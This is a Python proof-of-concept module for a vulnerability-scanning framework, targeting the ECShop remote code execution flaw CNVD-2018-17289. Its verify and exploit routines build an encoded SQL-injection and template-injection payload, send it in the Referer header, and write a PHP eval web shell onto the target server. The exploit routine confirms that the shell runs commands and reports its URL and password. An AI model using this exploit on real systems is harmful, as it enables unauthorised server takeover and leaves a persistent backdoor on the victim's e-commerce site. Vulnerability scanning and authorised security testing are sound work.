# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import binascii
import base64


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0007'  # 平台漏洞编号，留空
    name = 'ECShop全系列版本远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2018-09-03'  # 漏洞公布时间
    desc = '''
        ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。 
        ECShop全系列版本存在远程代码执行漏洞。该漏洞是由于ECShop系统的user.php文件中，display函数的模板变量可控。攻击者无需登录等操作，获得服务器的权限。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-17289'  # 漏洞来源
    cnvd_id = 'CNVD-2018-17289'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = '2.7.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6a8cee34-824f-4a5d-9d6b-2b2a838eec96'
    author = '国光'  # POC编写者
    create_date = '2018-09-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 生成a-z命名方式的文件
            randstr = chr(random.randint(96, 122))

            filename_poc = randstr + '.txt'

            payload = "file_put_contents('{filename}','<?php eval($_GET[wss]); ?>')".format(filename=filename_poc)
            self.output.info("随机payload生成成功")
            payload_base64 = '''{$asd'];assert(base64_decode('%s'));//}xxx''' %base64.b64encode(payload.encode('utf-8')).decode('ascii')
            self.output.info("使用Base64加密payload")
            payload_hex = binascii.b2a_hex(payload_base64.encode('utf-8')).decode('ascii')
            self.output.info("使用十六进制加密payload")
            refer = '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x%s,10-- -";s:2:"id";s:3:"'/*";}'''%payload_hex
            headers = {
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
                'Referer': refer
            }

            url_paylpad = self.target + "/user.php?act=login"
            r = requests.get(url_paylpad,headers=headers)
            self.output.info("正在验证...")
            poc_url = self.target + filename_poc
            r2 = requests.get(poc_url)
            if 'wss' in r2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的漏洞利用'.format(
                target=self.target, vuln=self.vuln))

        # 生成a-z命名方式的文件
            randstr = chr(random.randint(96, 122))

            filename_poc = randstr + '.php'
            payload = "file_put_contents('{filename}','<?php eval($_POST[111]); ?>')".format(filename=filename_poc)
            self.output.info("随机payload生成成功")
            payload_base64 = '''{$asd'];assert(base64_decode('%s'));//}xxx''' %base64.b64encode(payload.encode('utf-8')).decode('ascii')
            self.output.info("使用Base64加密payload")
            payload_hex = binascii.b2a_hex(payload_base64.encode('utf-8')).decode('ascii')
            self.output.info("使用十六进制加密payload")
            refer = '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x%s,10-- -";s:2:"id";s:3:"'/*";}''' % payload_hex
            headers = {
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
                'Referer': refer
            }

            url_paylpad = self.target + "/user.php?act=login"
            r = requests.get(url_paylpad,headers=headers)
            self.output.info("正在进行漏洞利用...")
            poc_url = self.target + filename_poc
            post_data = {"111": "echo md5(c);"}
            r2 = requests.post(poc_url, data=post_data)
            if '4a8a08f09d37b73795649038408b5f33' in r2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，webshell地址：{webshell}，密码：111'.format(
                        target=self.target, name=self.vuln.name, webshell=self.target + filename_poc))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

if __name__ == '__main__':
    Poc().run()
